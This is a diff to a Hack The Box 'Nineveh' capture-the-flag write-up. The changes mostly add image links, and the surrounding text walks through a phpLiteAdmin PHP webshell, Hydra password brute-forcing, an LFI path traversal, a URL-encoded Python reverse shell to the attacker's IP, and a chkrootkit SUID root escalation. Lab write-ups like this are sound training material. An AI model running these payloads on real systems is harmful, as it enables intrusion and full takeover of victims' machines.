@@ -52,11 +52,11 @@ The web server software is running but no content has been added, yet.
 
 And on port 443 we find a simple image:
 
-nineveh_443.png
+![nineveh_443.png](../assets/nineveh_assets/nineveh_443.png)
 
 Using basic directory fuzzing we find a `/db` page, which appears to be a phpLiteAdmin page:
 
-nineveh_db.png
+![nineveh_db.png](../assets/nineveh_assets/nineveh_db.png)
 
 After trying just a few low-hanging-fruit passwords, I found I was able to login with the password `password123`.
 
@@ -84,9 +84,9 @@ Done!
 
 Lets take this idea and try to create a webshell. We'll create a new db called shell.php, and add a table called shell. From here we can replicate the step above and add the text field `<?php system($_GET["cmd"]); ?>`.
 
-nineveh_shell.png
+![nineveh_shell.png](../assets/nineveh_assets/nineveh_shell.png)
 
-CLicking create and returning to the shell.php db page we see it is being stored in `/var/tmp/shell.php` which means until we get deeper access to the target it doesn't seem usable to us yet.
+CLicking `create` and returning to the shell.php db page we see it is being stored in `/var/tmp/shell.php` which means until we get deeper access to the target it doesn't seem usable to us yet.
 
 Lets take step back and perform more thorough directory fuzzing:
 
@@ -104,13 +104,13 @@ and port 443:
 
 Looking at the scan output we find a department login page:
 
-nineveh_dirs80.png
+![nineveh_dirs80.png](../assets/nineveh_assets/nineveh_dirs80.png)
 
-nineveh_department.png
+![nineveh_department.png](../assets/nineveh_assets/nineveh_department.png)
 
 And looking at the page source we find an interesting comment:
 
-nineveh_source.png
+![nineveh_source.png](../assets/nineveh_assets/nineveh_source.png)
 
 Looks like Mysql is running internally, and we also discover a potential username amrois.
 
@@ -118,13 +118,13 @@ Trying to login if we enter `admin` as the username and an incorrect password we
 
 Trying common passwords got me nowhere here so I fired up Hydra and we found a hit:
 
-nineveh_hydra.png
+![nineveh_hydra.png](../assets/nineveh_assets/nineveh_hydra.png)
 
 `admin:1q2w3e4r5t`
 
 We can now access the site:
 
-nineveh_in.png
+![nineveh_in.png](../assets/nineveh_assets/nineveh_in.png)
 
 In the Notes section we find another note from amrois:
 
@@ -143,13 +143,13 @@ Which looks like its worth testing LFI here.
 
 Fiddling around with placement, I eventually found an LFI at: http://nineveh.htb/department/manage.php?notes=/ninevehNotes.txt../../../../../../../etc/passwd
 
-nineveh_lfi1.png
+![nineveh_lfi1.png](../assets/nineveh_assets/nineveh_lfi1.png)
 
 Trying to use this LFI to interact with the shell.php file we uploaded earlier, we can confirm execution as user www-data:
 
-nineveh_webshell.png
+![nineveh_webshell.png](../assets/nineveh_assets/nineveh_webshell.png)
 
-Lets grab a python reverse shell one-liner from revshell.com, URL encode it, and pass it as our command:
+Lets grab a python reverse shell one-liner from revshells.com, URL encode it, and pass it as our command:
 
 ```
 http://nineveh.htb/department/manage.php?notes=/ninevehNotes.txt../../../../../../../var/tmp/shell.php&cmd=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.14.214%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22%2Fbin%2Fbash%22%29%27
@@ -177,11 +177,11 @@ cat: user.txt: Permission denied
 
 Not finding much of interest I decided to load pspy64, and we find that `chkrootkit` is running very frequently:
 
-nineveh_chkroot.png
+![nineveh_chkroot.png](../assets/nineveh_assets/nineveh_chkroot.png)
 
 Looking for exploits I find: https://www.exploit-db.com/exploits/33899
 
-Lets create a file called `update` in `/tmp` that sets the SUId on `/bin/bash`
+Lets create a file called `update` in `/tmp` that sets the SUID on `/bin/bash`
 
 ```
 www-data@nineveh:/tmp$ cat update 
@@ -208,9 +208,9 @@ uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
 
 And we can now grab the two flags:
 
-nineveh_user_flag.png
+![nineveh_user_flag.png](../assets/nineveh_assets/nineveh_user_flag.png)
 
-nineveh_root_flag.png
+![nineveh_root_flag.png](../assets/nineveh_assets/nineveh_root_flag.png)
 
 Thanks for following along!
 
